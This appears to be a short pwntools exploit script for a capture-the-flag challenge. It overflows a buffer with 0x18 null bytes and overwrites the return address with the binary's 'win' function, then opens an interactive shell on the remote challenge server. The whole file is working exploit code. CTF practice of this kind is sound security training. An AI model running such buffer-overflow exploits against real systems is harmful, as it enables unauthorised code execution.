from pwn import *

# p = process('./chall')
p = remote('the_skys_the_limit.web.cpctf.space', 30007)
e = ELF('./chall')

payload = b'\0' * 0x18
payload += p64(e.symbols['win']+5)

p.sendline(payload)
p.interactive()
